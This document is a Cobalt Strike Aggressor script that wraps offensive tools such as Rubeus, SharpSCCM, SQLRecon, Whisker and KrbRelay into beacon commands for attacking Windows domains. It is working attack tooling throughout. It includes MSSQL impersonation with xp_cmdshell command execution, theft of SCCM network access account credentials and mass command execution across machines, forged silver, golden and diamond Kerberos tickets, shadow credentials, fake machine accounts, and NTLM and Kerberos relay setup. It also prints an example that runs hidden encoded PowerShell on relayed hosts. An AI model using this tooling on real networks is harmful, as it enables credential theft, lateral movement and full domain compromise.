    bexecute_assembly($1, $SQLRECON_PATH, "/a:wintoken /m:whoami /h:" . $2);
}
beacon_command_register(
    "mssql_accesstestme",
    "Use SQLRecon to test access to a MSSQL server instances",
    "Usage: mssql_accesstestme [instance]"
);

## TEST AUTHENTICATION
alias mssql_accesstestuser {
    println("mssql_accesstestuser: " . @_);
    $instance   = @_[1];
    $domain     = @_[2];
    $user       = @_[3];
    $password   = @_[4];

    $args = "/a:windomain /m:whoami "
    . " /h:" . $instance
    . " /d:" . $domain
    . " /u:" . $user
    . " /p:" . $password;

    bexecute_assembly($1, $SQLRECON_PATH, $args );
}
beacon_command_register(
    "mssql_accesstestuser",
    "Use SQLRecon to test access to a MSSQL server instances",
    "Usage: mssql_accesstestuser [instance] [domain] [user] [password]"
);

## EXECUTE QUERIES
alias mssql_query {
    $size       = size(@_);

    $args = "";
    if ($size == 3)
    {
        $instance   = @_[1];
        $query      = @_[2];

        $args = "/a:wintoken /m:query "
        . " /h:" . $instance
        . " /c:\"" . $query . "\"";
        println("mssql_checkimpersonation - args = " . $args);

    }
    else if ($size == 6)
    {
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];
        $query      = @_[5];

        $args = "/a:windomain /m:query"
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password
        . " /c:\"" . $query . "\"";
        println("mssql_checkimpersonation - args = " . $args);

    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    bexecute_assembly($1, $SQLRECON_PATH, $args );
}
beacon_command_register(
    "mssql_query",
    "Use SQLRecon to run query against an instance",
    "Usage:\n"
    . "mssql_query [instance] [query]\n"
    . "mssql_query [instance] [domain] [user] [password] [query]"
);

alias mssql_iquery {
    $size = size(@_);

    $args = "";
    if ($size == 4)
    {
        #[instance] [Impersonated User] [query]
        $instance   = @_[1];
        $impaccount = @_[2];
        $query      = @_[3];

        $args = "/a:wintoken /m:iquery "
        . " /h:" . $instance
        . " /i:" . $impaccount
        . " /c:\"" . $query . "\"";
        println("mssql_iquery - args = " . $args);

    }
    else if ($size == 7)
    {
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];
        $impaccount = @_[5];
        $query      = @_[6];

        $args = "/a:windomain /m:iquery"
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password
        . " /i:" . $impaccount
        . " /c:\"" . $query . "\"";
        println("mssql_iquery - args = " . $args);

    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    bexecute_assembly($1, $SQLRECON_PATH, $args );
}
beacon_command_register(
    "mssql_iquery",
    "Use SQLRecon to run query against an instance",
    "Usage:\n"
    . "mssql_iquery [instance] [Impersonated User] [query]\n"
    . "mssql_iquery [instance] [domain] [user] [password] [Impersonated User] [query]"
);

alias mssql_checkimpersonation {
    $size = size(@_);

    $query_imperonsate = "SELECT \* FROM sys.server_permissions WHERE permission_name = \'IMPERSONATE\'";

    $args = "";
    if ($size == 2)
    {
        $instance   = @_[1];

        $args = "/a:wintoken /m:query "
        . " /h:" . $instance;
        # . " /c:\"" . $query_imperonsate . "\"";
        println("mssql_checkimpersonation - args = " . $args);
    }
    else if ($size == 5)
    {
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];

        $args = "/a:windomain /m:query"
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password;
        # . " /c:\"" . $query_imperonsate . "\"";
        println("mssql_checkimpersonation - args = " . $args);
    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    # bexecute_assembly($1, $SQLRECON_PATH, $args, $null, &mssql_checkimpersonation_cb);
    bexecute_assembly($1, $SQLRECON_PATH, $args . " /c:\"" . $query_imperonsate . "\"", $null, lambda({ mssql_checkimpersonation_cb ($1, $2, $args); }));
}
sub mssql_checkimpersonation_cb {
    blog($1, $2);
    $regex = '\p{Digit}+ \| \w+ \| \p{Digit}+ \| \p{Digit}+ \| (\p{Digit}+) \| (\p{Digit}+)';
    ($grantee, $grantor) = matches($2, $regex);
    
    $query = "SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals WHERE principal_id =  $+ $grantor $+  OR principal_id =  $+ $grantee $+ ;";
    bexecute_assembly($1, $SQLRECON_PATH, $args . " /c:\"" . $query . "\"");
}
beacon_command_register(
    "mssql_checkimpersonation",
    "Use SQLRecon to run query to check impersonation",
    "Usage:\n"
    . "mssql_checkimpersonation [instance]\n"
    . "mssql_checkimpersonation [instance] [domain] [user] [password]"
);

alias mssql_impersonatecommand {
    $size       = size(@_);

    $args = "";
    if ($size == 4)
    {
        # [instance] [impersonating account] [module]
        $instance   = @_[1];
        $impaccount = @_[2];
        $module     = @_[3];

        $args = "/a:wintoken"
        . " /m:" . $module
        . " /h:" . $instance
        . " /i:\"" . $impaccount . "\"";
        println("mssql_impersonatecommand - args = " . $args);

    }
    else if ($size == 6)
    {
        # [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [module]
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];
        $impaccount = @_[5];
        $module     = @_[6];

        $args = "/a:windomain"
        . " /m:" . $module
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password
        . " /i:\"" . $impaccount . "\"";
        println("mssql_impersonatecommand - args = " . $args);

    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    bexecute_assembly($1, $SQLRECON_PATH, $args);
}
beacon_command_register(
    "mssql_impersonatecommand",
    "Use SQLRecon to run impersionated module against an instance",
    "Usage:\n"
    . "mssql_impersonatecommand [instance] [impersonating account] [module]\n"
    . "mssql_impersonatecommand [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [module]"
);

sub mssql_irunoscmd_cb2 {
    #($1, $2, $3, $args)
    blog($1, $2);
    $args = $4;
    println("$4 = " . $4);
    bexecute_assembly($1, $SQLRECON_PATH, $args . " /m:idisablexp");
}
sub mssql_irunoscmd_cb1 {
    #($1, $2, $3, $args, $command)
    blog($1, $2);
    $args = $4;
    $command = $5;
    $cb1_args = $args . " /m:ixpcmd /c:\"" . $command . "\"";

    bexecute_assembly($1, $SQLRECON_PATH, $cb1_args, $null, lambda({ mssql_irunoscmd_cb2 ($1, $2, $3, $args); }));
}
alias mssql_irunoscmd {
    $size = size(@_);

    $args = "";
    if ($size == 4)
    {
        # [instance] [impersonating account] [command]
        $instance   = @_[1];
        $impaccount = @_[2];
        $command    = @_[3];

        $args = "/a:wintoken"
        . " /h:" . $instance
        . " /i:" . $impaccount;
        println("mssql_impersonatecommand - args = " . $args);

    }
    else if ($size == 6)
    {
        # [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [command]
        $instance   = @_[1];
        $domain     = @_[2];
        $user       = @_[3];
        $password   = @_[4];
        $impaccount = @_[5];
        $command    = @_[6];

        $args = "/a:windomain"
        . " /h:" . $instance
        . " /d:" . $domain
        . " /u:" . $user
        . " /p:" . $password
        . " /i:" . $impaccount;
        println("mssql_irunoscmd - args = " . $args);

    }
    else
    {
        berror($1, "Invalid parameters specified.");
        return;
    }
    
    bexecute_assembly($1, $SQLRECON_PATH, $args . " /m:ienablexp", $null, lambda({ mssql_irunoscmd_cb1 ($1, $2, $3, $args, $command); }));
}
beacon_command_register(
    "mssql_irunoscmd",
    "Use SQLRecon to run impersionated OS command against an instance",
    "Use SQLRecon to run impersionated OS command against an instance
This command will enable XPCMD, run the command, then disable it.

Usage:\n"
    . "mssql_irunoscmd [instance] [impersonating account] [module]\n"
    . "mssql_irunoscmd [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [module]"
);

## LINK ABUSE METHODS
alias mssql_checklinks {
    $size       = size(@_);
    $instance   = $2;
    $args       = join(" ", sublist(@_, 2, $size));
    $command    = "Get-SQLServerLinkCrawl -Instance \"" . $instance . "\" " . $args;

    bpowerpick($1, $command);
}
beacon_command_register(
    "mssql_checklinks",
    "Use PowerUpSQL to run query to check for links",
    "Usage:\n"
    . "mssql_checklinks [instance] (PowerUpSQL Additional Args)\n"
);

#SCCM ENUMRATION AND ATTACKS
##Enumeration
sub sccm_getinfo_cb {
    blog($1, $2);
}
alias sccm_getinfo{
    $size = size(@_);
    if ($size != 2) {
        berror($1, "Invalid Parameters.");
        return;
    } else {
        $args = "get site-info -d " . $2 . " --no-banner";
        bexecute_assembly($1, $SHARPSCCM_PATH, $args, $null, &sccm_getinfo_cb);
        bexecute_assembly($1, $SHARPSCCM_PATH, "get collections --no-banner", $null, &sccm_getinfo_cb);
    }
}
beacon_command_register(
    "sccm_getinfo",
    "sccm_getinfo",
    "Use SharpSCCM to get SCCM site info\n\n"
    . "Usage:\n"
    . "sccm_getinfo [domain]"
)

##Get Network Access Account Creds
alias sccm_getnaacreds {
    $size   = size(@_);
    if ( $size == 2 ) {
        $source = @_[1];
        if(-isadmin $1){
            if ($source ismatch "local") {
                $args = "local naa -m wmi --no-banner";
            } else if ($source ismatch "server") {
                $args = "get naa --no-banner";
            } else {
                berror($1, "Unknown Arguement: " . $source);
                return;
            }
        } else {
            berror($1, "Must be run as an admin user!");
            return;
        }
        
    } else {
        berror($1, "Invalid Paramters!");
        return;
    }
    
    bexecute_assembly($1, $SHARPSCCM_PATH, $args);
}
beacon_command_register(
    "sccm_getnaacreds",
    "Get SCCM NAA Creds",
    "Get SCCM NAA Creds using SharpSCCM\n\n"
    . "Usage: sccm_getnaacreds [local|server]\n"
    . "  Requirements:\n"
    . "    Administrator Access\n"
    . "    Not use SMB Beacon"
)

## MASS LATERAL MOVEMENT!
alias sccm_massLateralMovement {
    $size    = size(@_);
    $beacon  = $1;
    $colname = $2;
    $command = join(" ", sublist(@_, 2, $size));

    $args = "exec"
    . " -n " . $colname
    . " -p \"" . $command . "\""
    . " -s --no-banner";

    bexecute_assembly($beacon, $SHARPSCCM_PATH, $args);
}
beacon_command_register(
    "sccm_massLateralMovement",
    "Specify command to run against all machines in a collection",
    "Specify command to run against all machines in a collection\n\n"
    ."Usages: sccm_massLateralMovement [CollectionName] [Command]"
)

#DOMAIN TAKEOVER ATTACKS
## SILVER TICKETS
alias kerberos_silverticket {
    $size = size(@_);
    if ($size == 6) {
        $user    = @_[1];
        $domain  = @_[2];
        $sid     = @_[3];
        $hash    = @_[4];
        $service = @_[5];

        $parameters = "silver"
        . " /user:" . $user
        . " /domain:" . $domain
        . " /sid:" . $sid
        . " /" . $hash
        . " /service:" . $service
        . " /nowrap"
    } else {
        berror($1, "Invalid Parameters");
        return;
    }
    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
}
beacon_command_register(
    "kerberos_silverticket",
    "Request a silver ticket",
    "Use Rubeus to request a silver TGS\n\n"
    . "Usage:\n"
    . "kerberos_silverticket [user] [domain fqdn] [Domain SID] [hashType:hash] [service]\n\n"
    . "hashType = [des|rc4|aes128|aes256]"
    . "Example service: cifs/wkstn1.domain.local\n"
    . "See: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket"
)

alias kerberos_createnetonly {
    $size = size(@_);
    if ($size == 4) {
        $program = @_[1];
        $domain  = @_[2];
        $user    = @_[3];
        $pass    = rand_alphanum(8);

        $parameters = "createnetonly"
        . " /program:" . $program
        . " /domain:" . $domain
        . " /username:" . $user
        . " /password:" . $pass;

        bexecute_assembly($1, $RUBEUS_PATH, $parameters)
    } else if ($size == 5) {
        $program = @_[1];
        $domain  = @_[2];
        $user    = @_[3];
        $ticket  = @_[4];
        $pass    = rand_alphanum(8);

        $parameters = "createnetonly"
        . " /program:" . $program
        . " /domain:" . $domain
        . " /username:" . $user
        . " /password:" . $pass
        . " /ticket:" . $ticket;

        bexecute_assembly($1, $RUBEUS_PATH, $parameters)
    } else {
        berror($1, "Invalid parameters!");
    }
}

beacon_command_register(
    "kerberos_createnetonly",
    "Use Rebeus to create a net process",
    "Use Rebeus to create a net process\n\n"
    . "Usage:  kerberos_createnetonly [program] [domain] [username]\n"
    . "        kerberos_createnetonly [program] [domain] [username] [ticket]"
)

alias kerberos_ptt {
    $size = size(@_);
    if ($size == 3) {
        $luid    = @_[1];
        $ticket  = @_[2];

        if ($luid == 0) {
            $parameters = "ptt"
            . " /ticket:" . $ticket;
        } else {
            $parameters = "ptt"
            . " /luid:" . $luid
            . " /ticket:" . $ticket;
        }

        bexecute_assembly($1, $RUBEUS_PATH, $parameters)
    } else {
        berror($1, "Invalid parameters!");
    }
}
beacon_command_register(
    "kerberos_ptt",
    "Use Rubeus to pass-the-ticket to the LUID",
    "Use Rubeus to pass-the-ticket to the LUID\n\n"
    . "Usage: kerberos_ptt [LUID] [ticket]\n"
    . "Specify LUID 0 for current session"
)

alias kerberos_goldenticket {
    $size = size(@_);
    #[domain] [user] [Domain SID] [hashType:hash]
    if ($size == 5) {
        $domain  = @_[1];
        $user    = @_[2];
        $sid     = @_[3];
        $hash    = @_[4];

        $parameters = "golden"
        . " /user:" . $user
        . " /domain:" . $domain
        . " /sid:" . $sid
        . " /" . $hash
        . " /nowrap"
    } else {
        berror($1, "Invalid Parameters");
        return;
    }
    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
}
beacon_command_register(
    "kerberos_goldenticket",
    "Use Rubeus to forge a golden TGT",
    "Use Rubeus to forge a golden TGT\n\n"
    . "Usage: kerberos_goldenticket [domain] [user] [Domain SID] [hashType:hash]\n"
    . "hashType = [des|rc4|aes128|aes256]"
)

alias kerberos_diamondticket {
    $size = size(@_);
    #[ticket user] [ticket user RID] [groupscsv] [krbkey(aes256)]
    if ($size == 5) {
        $username = @_[1];
        $userrid  = @_[2];
        $groups   = @_[3];
        $hash     = @_[4];

        $parameters = "diamond /tgtdeleg"
        . " /ticketuser:" . $username
        . " /ticketuserid:" . $userrid
        . " /groups:" . $groups
        . " /krbkey:" . $hash
        . " /nowrap"
    } else {
        berror($1, "Invalid Parameters");
        return;
    }
    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
}
beacon_command_register(
    "kerberos_diamondticket",
    "Use Rubeus to forge a golden TGT",
    "Use Rubeus to forge a golden TGT\n\n"
    . "Usage:\n"
    . "kerberos_diamondticket [ticket user] [ticket user RID] [groupscsv] [krbkey(aes256)]\n"
)

alias kerberos_s4u {
    $size = size(@_);
    $parameters = "s4u /nowrap";
    if( ($size == 5) || (($size == 6) && (@_[5] ismatch "ptt")) ) {
        $impuser    = @_[1];
        $delspn     = @_[2];
        $user       = @_[3];
        $ticket     = @_[4];
        $parameters = $parameters
        . " /impersonateuser:" . $impuser
        . " /msdsspn:" . $delspn
        . " /user:" . $user
        . " /ticket:" . $ticket;
        if (@_[5] ismatch "ptt") { $parameters = $parameters . " /ptt"}
    } else if ( ($size == 6) || (($size == 7) && (@_[6] ismatch "ptt")) ) {
        $impuser    = @_[1];
        $delspn     = @_[2];
        $altspn     = @_[3];
        $user       = @_[4];
        $ticket     = @_[5];
        $parameters = $parameters
        . " /impersonateuser:" . $impuser
        . " /msdsspn:" . $delspn
        . " /altservice:" . $altspn
        . " /user:" . $user
        . " /ticket:" . $ticket;
        if (@_[6] ismatch "ptt") { $parameters = $parameters . " /ptt"}
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }
    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
}
beacon_command_register(
    "kerberos_s4u",
    "Use Rubeus to perform S4U delegation",
    "Use Rubeus to perform S4U delegation\n\n"
    . "Usage: kerberos_s4u [impersonated user] [delegatable spn] [ticket user] [ticket] (ptt)\n"
    . "       kerberos_s4u [impersonated user] [delegatable spn] [alt spn] [ticket user] [ticket] (ptt)\n\n"
    . "Examples:\n"
    . "[delegatable spn] - cifs/host.domain.tld\n"
    . "[alt spn] - ldap\n"
)

alias kerberos_s4uself {
    $size = size(@_);
    $parameters = "s4u /nowrap /self";
    if( $size >= 5 ) {
        $impuser    = @_[1];
        $altspn     = @_[2];
        $user       = @_[3];
        $ticket     = @_[4];
        $ptt        = @_[5];

        $parameters = $parameters
        . " /impersonateuser:" . $impuser
        . " /altservice:" . $altspn
        . " /user:" . $user
        . " /ticket:" . $ticket;
        if ($ptt ismatch 'ptt') {
            $parameters = $parameters . " /ptt";
        }
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }

    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
}
beacon_command_register(
    "kerberos_s4uself",
    "Use Rubeus to perform S4U2Self delegation",
    "Use Rubeus to perform S4U2Self delegation\n\n"
    . "Usage: kerberos_s4uself [impersonated user] [altservice spn] [ticket user] [ticket] (ptt)\n\n"
    . "Examples:\n"
    . "[altservice spn] - cifs/host.domain.tld\n"
)
sub get_machineaccountquota_cb {
    $string = replace($2, '\.', ",DC=");
    $string = replace($string, "\n", "");
    $dn = 'DC=' . $string;
    $command = 'Get-DomainObject -Identity "' . $dn . '" -Properties ms-DS-MachineAccountQuota';
    blog($1, "Targetting Domain: " $2);
    bpowerpick($1, $command);
}
alias get_machineaccountquota {
    $command = "Get-Domain | select -expand Name";
    bpowerpick($1, $command, $null, $null, &get_machineaccountquota_cb);
}
beacon_command_register(
    "get_machineaccountquota",
    "Use PowerView to check machine account quota for current user",
    "Use PowerView to check machine account quota for current user.\n"
)
sub createfakemachine_cb {
    blog($1,$2);
    $regdomain = 'Domain.*\: (.*)';
    $reguser   = 'DN.*\: CN=(.*),CN=Computers';
    $regpassword  = 'Password \: (.*)';
    $domain = matches($2, $regdomain)[0];
    $user = matches($2, $reguser)[0] . '$';
    $password = matches($2, $regpassword)[0];

    $parameters = "hash"
    . " /password:" . $password
    . " /user:" . $user
    . " /domain:" . $domain;

    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
}
alias createfakemachine {
    $size = size(@_);
    if ($size == 2) {
        $name = @_[1];
        $parameters = "--computer " . $name . " --make";
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }
    bexecute_assembly($1, $STANDIN_PATH, $parameters, $null, &createfakemachine_cb);
}
beacon_command_register (
    "createfakemachine",
    "Use StandIn & Rubesu to make a fake machine acount and return account hashes",
    "Use StandIn & Rubesu to make a fake machine acount and return account hashes\n\n"
    . "Usage: createfakemachine [name]"
)
alias shadowcreds_list {
    $size = size(@_);
    if ($size == 2) {
        $parameters = 'list /target:' . $2;
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }
    bexecute_assembly($1, $WHISKER_PATH, $parameters);
}
beacon_command_register(
    "shadowcreds_list",
    "Use Whisker to check account's msDS-KeyCredentialLink",
    "Use Whisker to check account's msDS-KeyCredentialLink\n\n"
    . "Usage: shadowcreds_list [account name]"
)
alias shadowcreds_add {
    $size = size(@_);
    if ($size == 2) {
        $parameters = 'add /target:' . $2;
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }
    bexecute_assembly($1, $WHISKER_PATH, $parameters);
}
beacon_command_register(
    "shadowcreds_add",
    "Use Whisker to add certificate to msDS-KeyCredentialLink",
    "Use Whisker to add certificate to msDS-KeyCredentialLink\n\n"
    . "Usage: shadowcreds_add [account name]"
)

alias shadowcreds_remove {
    $size = size(@_);
    if ($size == 3) {
        $parameters = 'remove'
        . ' /target:' . $2
        . ' /deviceid:'. $3;
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }
    bexecute_assembly($1, $WHISKER_PATH, $parameters);
}
beacon_command_register(
    "shadowcreds_remove",
    "Use Whisker to add certificate to msDS-KeyCredentialLink",
    "Use Whisker to add certificate to msDS-KeyCredentialLink\n\n"
    . "Usage: shadowcreds_remove [account name] [device id]\n\n"
    . "Use shadowcreds_list to find the device ID."
)
alias ntlmrelay_driverupload {
    local('$handle $driver');

    #import the driver
    $handle = openf($WINDIRVERT_DRIVER);
    $driver = readb($handle, -1);
    closef($handle);

    #upload driver to target
    bupload_raw($1, "C:\\Windows\\system32\\drivers\\WinDivert64.sys", $driver);

    blog($1, "Make sure and load the PortBender.cna file if needed!");
}
beacon_command_register(
    "ntlmrelay_driverupload",
    "Upload WinDivert Driver",
    "Upload WinDivert Driver"
)

alias ntlmrelay_driverdelete {
    blog($1, "Removing WinDivert driver...");
    # bcd($1, "C:\\Windows\\system32\\drivers");
    brm($1, "C:\\Windows\\system32\\drivers\\WinDivert64.sys");
}
beacon_command_register(
    "ntlmrelay_driverdelete",
    "Delete WinDivert Driver",
    "Delete WinDivert Driver"
)

sub ntlmrelay_relayup_cb {
    blog($1, $2);
    $message = 
    "Example command to run on Team Server to relay NTLM auth:\n\n"
    . "sudo proxychains ntlmrelayx.py -t smb://<relaytarget> -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc <base64>\n";
    blog($1, $message);
}
alias ntlmrelay_relayup {
    bcd($1, "C:\\Windows\\system32\\drivers");

    #setup rportfwd
    blog($1, "Reverse port forwarding TCP\\8445 -> TeamServer:445 & TCP\\8080 -> TeamServer:80");
    brportfwd($1, 8445, 'localhost', 445); #Redirect SMB
    brportfwd($1, 8080, 'localhost', 80); #redirct for web callbacks

    #setup socks proxy
    blog($1, "Establishing Socks4a proxy on TeamServer:1080");
    bsocks($1, 1080)

    #Setup Port Bender
    $args = "redirect 445 8445";

    blog($1, "Launching PortBender module using reflective DLL injection");
    blog($1, "Redirecting TCP\\445 -> TCP\\8445");
    bdllspawn($1, $PORTBENDER_DLL, $args, "PortBender", 5000, false, &ntlmrelay_relayup_cb);
}
beacon_command_register(
    "ntlmrelay_relayup",
    "Setup Portbender, rportfwd, and socks proxy",
    "Setup Portbender(445->8445), rportfwd(8445->TX:445), and socks proxy(1080)\n"
)

alias ntlmrelay_relaydown {
    #setup rportfwd
    blog($1, "Killing reverse port forwarding TCP\\8445 -> TeamServer:445 & TCP\\8080 -> TeamServer:80");
    brportfwd_stop($1, 8445);
    brportfwd_stop($1, 8080);

    #setup socks proxy
    blog($1, "Killing Socks4a proxy on TeamServer:1080");
    bsocks_stop($1);

    #Setup Port Bender
    bjobs($1);
    blog($1, "Besure and kill the JOB and associated PROCESS for PortBender!");
}
beacon_command_register(
    "ntlmrelay_relayup",
    "Stop Portbender, rportfwd, and socks proxy",
    "Stop Portbender(445->8445), rportfwd(8445->TX:445), and socks proxy(1080)\n\n"
    . "Besure and kill the JOB and associated PROCESS for PortBender"
)

alias krbrelay_checkport {
    $assembly = getFileProper("C:\\Tools\\KrbRelay\\CheckPort\\bin\\Release\\CheckPort.exe");
    bexecute_assembly($1, $assembly);
}
beacon_command_register(
    "krbrelay_checkport",
    "Check for OXID reslover ports",
    "Check for OXID reslover ports"
)

alias krbrelay_up {
    $size = size(@_);
    $command = @_[1];
    if (($size == 5) && ($command ismatch 'rbcd')) {
        $spn    = @_[2];
        $sid    = @_[3];
        $port   = @_[4];

        $parameters = "-spn " . $spn
        . " -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8"
        . " -rbcd " . $sid
        . " -port " . $port;
    } else if (($size == 4) && ($command ismatch 'sc')) {
        $spn    = @_[2];
        $port   = @_[3];

        $parameters = "-spn " . $spn
        . " -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8"
        . " -shadowcred"
        . " -port " . $port;
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }
    bexecute_assembly($1, $KRBRELAY_PATH, $parameters); 
}
beacon_command_register(
    "krbrelay_up",
    "Stand up Kerberos Relay",
    "Stand up Kerberos Relay\n\n"
    . "Usage:\n"
    . "krbrelay_up rbcd [target spn] [Fake machine SID] [port]\n"
    . "krbrelay_up sc [target spn] [port]"
)
alias webdav_check{
    local('$file $handle $data $args');

    # read in the right BOF file
    $file = getFileProper("C:\\Tools\\GetWebDAVStatus\\GetWebDAVStatus_BOF\\GetWebDAVStatus_x64.o");
    $handle = openf($file);
    $data   = readb($handle, -1);
    closef($handle);

    # pack our arguments
    $size = size(@_);
    $args = join(" ", sublist(@_, 1, $size));

    # execute it.
    beacon_inline_execute($1, $data, "go", $args);
}
beacon_command_register(
    "webdav_check",
    "Use BOF to check targets for webdav named pipe \'DAV RPC SERVICE\'",
    "Use BOF to check targets for webdav named pipe \'DAV RPC SERVICE\'\n\n"
    . "Usage: webdav_check [host(s) csv]\n"
    . "Example: webdav_check host1,host2,host3"
)
